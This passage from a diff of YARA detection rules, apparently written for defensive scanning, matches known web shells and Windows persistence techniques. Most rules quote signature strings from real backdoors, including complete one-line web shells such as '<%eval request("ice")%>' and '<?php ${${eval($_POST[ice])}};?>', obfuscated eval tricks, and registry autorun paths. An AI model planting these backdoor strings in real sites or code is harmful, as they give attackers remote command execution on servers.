-        $c3 = "CreateProcess"
-        $c4 = "CreateThread"
-    condition:
-        ($f1 and $c1 ) or $f2 and ($c2 or $c3 or $c4)
-}
-
-rule persistence {
-    meta:
-        author = "x0r"
-        description = "Install itself for autorun at Windows startup"
-	version = "0.1"
-    strings:
-        $p1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" nocase
-        $p2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" nocase
-        $p3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices" nocase
-        $p4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce" nocase
-        $p5 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" nocase
-        $p6 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" nocase
-        $p7 = "SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" nocase
-        $p8 = "SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows" nocase
-        $p9 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler" nocase
-        $p10 = "comfile\\shell\\open\\command" nocase
-        $p11 = "piffile\\shell\\open\\command" nocase
-        $p12 = "exefile\\shell\\open\\command" nocase
-        $p13 = "txtfile\\shell\\open\\command" nocase
-	$p14 = "\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
-        $f1 = "win.ini" nocase
-        $f2 = "system.ini" nocase
-        $f3 = "Start Menu\\Programs\\Startup" nocase
-    condition:
-        any of them
-}
-
 rule asp_file : webshell {
 	meta:
 		description = "Laudanum Injector Tools - file file.asp"
@@ -1244,53 +580,6 @@ rule php_reverse_shell : webshell {
 		$s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii /* PEStudio Blacklist: strings */
 	condition:
 		filesize < 15KB and all of them
-}
-
-rule php_dns  : webshell{
-	meta:
-		description = "Laudanum Injector Tools - file dns.php"
-		author = "Florian Roth"
-		reference = "http://laudanum.inguardians.com/"
-		date = "2015-06-22"
-		hash = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
-	strings:
-		$s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
-		$s4 = "foreach (array_keys($types) as $t) {" fullword ascii
-	condition:
-		filesize < 15KB and all of them
-}
-
-rule WEB_INF_web  : webshell{
-	meta:
-		description = "Laudanum Injector Tools - file web.xml"
-		author = "Florian Roth"
-		reference = "http://laudanum.inguardians.com/"
-		date = "2015-06-22"
-		hash = "0251baed0a16c451f9d67dddce04a45dc26cb4a3"
-	strings:
-		$s1 = "<servlet-name>Command</servlet-name>" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii
-	condition:
-		filesize < 1KB and all of them
-}
-
-rule jsp_cmd : webshell {
-	meta:
-		description = "Laudanum Injector Tools - file cmd.war"
-		author = "Florian Roth"
-		reference = "http://laudanum.inguardians.com/"
-		date = "2015-06-22"
-		hash = "55e4c3dc00cfab7ac16e7cfb53c11b0c01c16d3d"
-	strings:
-		$s0 = "cmd.jsp}" fullword ascii
-		$s1 = "cmd.jspPK" fullword ascii
-		$s2 = "WEB-INF/web.xml" fullword ascii /* Goodware String - occured 1 times */
-		$s3 = "WEB-INF/web.xmlPK" fullword ascii /* Goodware String - occured 1 times */
-		$s4 = "META-INF/MANIFEST.MF" fullword ascii /* Goodware String - occured 12 times */
-	condition:
-		uint16(0) == 0x4b50 and filesize < 2KB and all of them
 }
 
 rule WEB_INF_web  : webshell{
@@ -1412,6 +701,6890 @@ rule Laudanum_Tools_Generic  : webshell Toolkit{
 		$s2 = "*** Laudanum Project" fullword ascii
 	condition:
 		filesize < 60KB and all of them
+}
+
+rule Weevely_Webshell : webshell {
+	meta:
+		description = "Weevely Webshell - Generic Rule - heavily scrambled tiny web shell"
+		author = "Florian Roth"
+		reference = "http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html"
+		date = "2014/12/14"
+		score = 60
+	strings:
+		$php = "<?php" ascii
+		$s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
+		$s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
+		$s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
+		$s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
+	condition:
+		$php at 0 and all of ($s*) and filesize > 570 and filesize < 800
+}
+
+rule webshell_h4ntu_shell_powered_by_tsoi_  : webshell {
+	meta:
+		description = "Web Shell - file h4ntu shell [powered by tsoi].php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "06ed0b2398f8096f1bebf092d0526137"
+	strings:
+		$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
+		$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
+		$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
+		$s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
+	condition:
+		all of them
+}
+
+rule webshell_PHP_sql  : webshell {
+	meta:
+		description = "Web Shell - file sql.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "2cf20a207695bbc2311a998d1d795c35"
+	strings:
+		$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
+		$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
+	condition:
+		all of them
+}
+
+rule webshell_PHP_a : webshell {
+	meta:
+		description = "Web Shell - file a.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "e3b461f7464d81f5022419d87315a90d"
+	strings:
+		$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
+		$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
+		$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
+	condition:
+		2 of them
+}
+
+rule webshell_Jspspyweb  : webshell{
+	meta:
+		description = "Web Shell - file Jspspyweb.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "4e9be07e95fff820a9299f3fb4ace059"
+	strings:
+		$s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
+		$s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"
+	condition:
+		all of them
+}
+
+rule webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2  : webshell{
+	meta:
+		description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "49ad9117c96419c35987aaa7e2230f63"
+	strings:
+		$s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
+		$s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"
+	condition:
+		1 of them
+}
+
+rule webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend  : webshell{
+	meta:
+		description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
+	strings:
+		$s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
+		$s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
+	condition:
+		1 of them
+}
+
+rule webshell_phpshell_2_1_pwhash  : webshell{
+	meta:
+		description = "Web Shell - file pwhash.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "ba120abac165a5a30044428fac1970d8"
+	strings:
+		$s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
+		$s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","
+	condition:
+		1 of them
+}
+
+rule webshell_PHPRemoteView  : webshell{
+	meta:
+		description = "Web Shell - file PHPRemoteView.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "29420106d9a81553ef0d1ca72b9934d9"
+	strings:
+		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
+		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
+	condition:
+		1 of them
+}
+
+rule webshell_jsp_12302  : webshell{
+	meta:
+		description = "Web Shell - file 12302.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a3930518ea57d899457a62f372205f7f"
+	strings:
+		$s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
+		$s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
+		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
+	condition:
+		all of them
+}
+
+rule webshell_caidao_shell_guo  : webshell{
+	meta:
+		description = "Web Shell - file guo.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "9e69a8f499c660ee0b4796af14dc08f0"
+	strings:
+		$s0 = "<?php ($www= $_POST['ice'])!"
+		$s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"
+	condition:
+		1 of them
+}
+
+rule webshell_PHP_redcod  : webshell{
+	meta:
+		description = "Web Shell - file redcod.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "5c1c8120d82f46ff9d813fbe3354bac5"
+	strings:
+		$s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
+		$s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
+	condition:
+		all of them
+}
+
+rule webshell_remview_fix  : webshell{
+	meta:
+		description = "Web Shell - file remview_fix.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a24b7c492f5f00e2a19b0fa2eb9c3697"
+	strings:
+		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
+		$s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"
+	condition:
+		1 of them
+}
+
+rule webshell_asp_cmd : webshell {
+	meta:
+		description = "Web Shell - file cmd.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "895ca846858c315a3ff8daa7c55b3119"
+	strings:
+		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
+		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
+		$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_php_sh_server : webshell {
+	meta:
+		description = "Web Shell - file server.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 50
+		hash = "d87b019e74064aa90e2bb143e5e16cfa"
+	strings:
+		$s0 = "eval(getenv('HTTP_CODE'));" fullword
+	condition:
+		all of them
+}
+
+rule webshell_PH_Vayv_PH_Vayv : webshell {
+	meta:
+		description = "Web Shell - file PH Vayv.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "35fb37f3c806718545d97c6559abd262"
+	strings:
+		$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
+		$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
+	condition:
+		1 of them
+}
+
+rule webshell_caidao_shell_ice  : webshell{
+	meta:
+		description = "Web Shell - file ice.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "6560b436d3d3bb75e2ef3f032151d139"
+	strings:
+		$s0 = "<%eval request(\"ice\")%>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_asp_shell : webshell {
+	meta:
+		description = "Web Shell - file shell.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "e63f5a96570e1faf4c7b8ca6df750237"
+	strings:
+		$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
+		$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_Private_i3lue  : webshell{
+	meta:
+		description = "Web Shell - file Private-i3lue.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "13f5c7a035ecce5f9f380967cf9d4e92"
+	strings:
+		$s8 = "case 15: $image .= \"\\21\\0\\"
+	condition:
+		all of them
+}
+
+rule webshell_Mysql_interface_v1_0 {
+	meta:
+		description = "Web Shell - file Mysql interface v1.0.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a12fc0a3d31e2f89727b9678148cd487"
+	strings:
+		$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
+	condition:
+		all of them
+}
+
+rule webshell_php_s_u {
+	meta:
+		description = "Web Shell - file s-u.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"
+	strings:
+		$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
+	condition:
+		all of them
+}
+
+rule webshell_phpshell_2_1_config {
+	meta:
+		description = "Web Shell - file config.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "bd83144a649c5cc21ac41b505a36a8f3"
+	strings:
+		$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
+	condition:
+		all of them
+}
+
+rule webshell_asp_EFSO_2 {
+	meta:
+		description = "Web Shell - file EFSO_2.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "a341270f9ebd01320a7490c12cb2e64c"
+	strings:
+		$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
+	condition:
+		all of them
+}
+
+rule webshell_jsp_up {
+	meta:
+		description = "Web Shell - file up.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "515a5dd86fe48f673b72422cccf5a585"
+	strings:
+		$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
+	condition:
+		all of them
+}
+
+rule webshell_NetworkFileManagerPHP {
+	meta:
+		description = "Web Shell - file NetworkFileManagerPHP.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "acdbba993a5a4186fd864c5e4ea0ba4f"
+	strings:
+		$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
+	condition:
+		all of them
+}
+
+rule webshell_Server_Variables {
+	meta:
+		description = "Web Shell - file Server Variables.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "47fb8a647e441488b30f92b4d39003d7"
+	strings:
+		$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
+		$s9 = "Variable Name</B></font></p>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_caidao_shell_ice_2 {
+	meta:
+		description = "Web Shell - file ice.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "1d6335247f58e0a5b03e17977888f5f2"
+	strings:
+		$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_caidao_shell_mdb {
+	meta:
+		description = "Web Shell - file mdb.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "fbf3847acef4844f3a0d04230f6b9ff9"
+	strings:
+		$s1 = "<% execute request(\"ice\")%>a " fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_guige {
+	meta:
+		description = "Web Shell - file guige.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "2c9f2dafa06332957127e2c713aacdd2"
+	strings:
+		$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
+	condition:
+		all of them
+}
+
+rule webshell_phpspy2010 {
+	meta:
+		description = "Web Shell - file phpspy2010.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "14ae0e4f5349924a5047fed9f3b105c5"
+	strings:
+		$s3 = "eval(gzinflate(base64_decode("
+		$s5 = "//angel" fullword
+		$s8 = "$admin['cookiedomain'] = '';" fullword
+	condition:
+		all of them
+}
+
+rule webshell_asp_ice {
+	meta:
+		description = "Web Shell - file ice.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d141e011a92f48da72728c35f1934a2b"
+	strings:
+		$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
+	condition:
+		all of them
+}
+
+rule webshell_drag_system {
+	meta:
+		description = "Web Shell - file system.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "15ae237cf395fb24cf12bff141fb3f7c"
+	strings:
+		$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
+	condition:
+		all of them
+}
+
+rule webshell_DarkBlade1_3_asp_indexx {
+	meta:
+		description = "Web Shell - file indexx.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "b7f46693648f534c2ca78e3f21685707"
+	strings:
+		$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
+	condition:
+		all of them
+}
+
+rule webshell_phpshell3 {
+	meta:
+		description = "Web Shell - file phpshell3.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "76117b2ee4a7ac06832d50b2d04070b8"
+	strings:
+		$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
+		$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
+		$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
+	condition:
+		2 of them
+}
+
+rule webshell_jsp_hsxa {
+	meta:
+		description = "Web Shell - file hsxa.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"
+	strings:
+		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
+	condition:
+		all of them
+}
+
+rule webshell_jsp_utils {
+	meta:
+		description = "Web Shell - file utils.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "9827ba2e8329075358b8e8a53e20d545"
+	strings:
+		$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
+		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
+	condition:
+		all of them
+}
+
+rule webshell_asp_01 {
+	meta:
+		description = "Web Shell - file 01.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 50
+		hash = "61a687b0bea0ef97224c7bd2df118b87"
+	strings:
+		$s0 = "<%eval request(\"pass\")%>" fullword
+	condition:
+		all of them
+}
+
+rule webshell_asp_404 {
+	meta:
+		description = "Web Shell - file 404.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "d9fa1e8513dbf59fa5d130f389032a2d"
+	strings:
+		$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
+	condition:
+		all of them
+}
+
+rule webshell_webshell_cnseay02_1 {
+	meta:
+		description = "Web Shell - file webshell-cnseay02-1.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "95fc76081a42c4f26912826cb1bd24b1"
+	strings:
+		$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
+	condition:
+		all of them
+}
+
+rule webshell_php_fbi {
+	meta:
+		description = "Web Shell - file fbi.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "1fb32f8e58c8deb168c06297a04a21f1"
+	strings:
+		$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
+	condition:
+		all of them
+}
+
+rule webshell_B374kPHP_B374k {
+	meta:
+		description = "Web Shell - file B374k.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "bed7388976f8f1d90422e8795dff1ea6"
+	strings:
+		$s0 = "Http://code.google.com/p/b374k-shell" fullword
+		$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
+		$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
+		$s4 = "B374k Vip In Beautify Just For Self" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_cmd_asp_5_1 {
+	meta:
+		description = "Web Shell - file cmd-asp-5.1.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
+	strings:
+		$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
+	condition:
+		all of them
+}
+
+rule webshell_php_dodo_zip {
+	meta:
+		description = "Web Shell - file zip.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "b7800364374077ce8864796240162ad5"
+	strings:
+		$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
+		$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
+	condition:
+		all of them
+}
+
+rule webshell_aZRaiLPhp_v1_0 {
+	meta:
+		description = "Web Shell - file aZRaiLPhp v1.0.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "26b2d3943395682e36da06ed493a3715"
+	strings:
+		$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
+		$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
+	condition:
+		all of them
+}
+
+rule webshell_php_list {
+	meta:
+		description = "Web Shell - file list.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "922b128ddd90e1dc2f73088956c548ed"
+	strings:
+		$s1 = "// list.php = Directory & File Listing" fullword
+		$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
+		$s9 = "// by: The Dark Raver" fullword
+	condition:
+		1 of them
+}
+
+rule webshell_ironshell {
+	meta:
+		description = "Web Shell - file ironshell.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
+	strings:
+		$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
+		$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
+	condition:
+		all of them
+}
+
+rule webshell_caidao_shell_404 {
+	meta:
+		description = "Web Shell - file 404.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"
+	strings:
+		$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
+	condition:
+		all of them
+}
+
+rule webshell_ASP_aspydrv {
+	meta:
+		description = "Web Shell - file aspydrv.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "de0a58f7d1e200d0b2c801a94ebce330"
+	strings:
+		$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
+	condition:
+		all of them
+}
+
+rule webshell_jsp_web {
+	meta:
+		description = "Web Shell - file web.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "4bc11e28f5dccd0c45a37f2b541b2e98"
+	strings:
+		$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
+	condition:
+		all of them
+}
+
+rule webshell_mysqlwebsh {
+	meta:
+		description = "Web Shell - file mysqlwebsh.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "babfa76d11943a22484b3837f105fada"
+	strings:
+		$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
+	condition:
+		all of them
+}
+
+rule webshell_jspShell {
+	meta:
+		description = "Web Shell - file jspShell.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"
+	strings:
+		$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
+		$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
+	condition:
+		all of them
+}
+
+rule webshell_Dx_Dx {
+	meta:
+		description = "Web Shell - file Dx.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
+	strings:
+		$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
+		$s9 = "class=linelisting><nobr>POST (php eval)</td><"
+	condition:
+		1 of them
+}
+
+rule webshell_asp_ntdaddy {
+	meta:
+		description = "Web Shell - file ntdaddy.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "c5e6baa5d140f73b4e16a6cfde671c68"
+	strings:
+		$s9 =  "if  FP  =  \"RefreshFolder\"  or  "
+		$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
+	condition:
+		1 of them
+}
+
+rule webshell_MySQL_Web_Interface_Version_0_8 {
+	meta:
+		description = "Web Shell - file MySQL Web Interface Version 0.8.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "36d4f34d0a22080f47bb1cb94107c60f"
+	strings:
+		$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
+	condition:
+		all of them
+}
+
+rule webshell_elmaliseker_2 {
+	meta:
+		description = "Web Shell - file elmaliseker.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
+	strings:
+		$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
+		$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
+	condition:
+		all of them
+}
+
+rule webshell_ASP_RemExp {
+	meta:
+		description = "Web Shell - file RemExp.asp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
+	strings:
+		$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
+		$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
+	condition:
+		all of them
+}
+
+rule webshell_jsp_list1 {
+	meta:
+		description = "Web Shell - file list1.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"
+	strings:
+		$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
+		$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
+	condition:
+		all of them
+}
+
+rule webshell_phpkit_1_0_odd {
+	meta:
+		description = "Web Shell - file odd.php"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "594d1b1311bbef38a0eb3d6cbb1ab538"
+	strings:
+		$s0 = "include('php://input');" fullword
+		$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
+		$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
+	condition:
+		all of them
+}
+
+rule webshell_jsp_123 {
+	meta:
+		description = "Web Shell - file 123.jsp"
+		author = "Florian Roth"
+		date = "2014/01/28"
+		score = 70
+		hash = "c691f53e849676cac68a38d692467641"
+	strings:
+		$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
+		$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
+		$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
+	condition:
+		all of them
+}
+
+rule webshell_asp_1 {
+	meta:
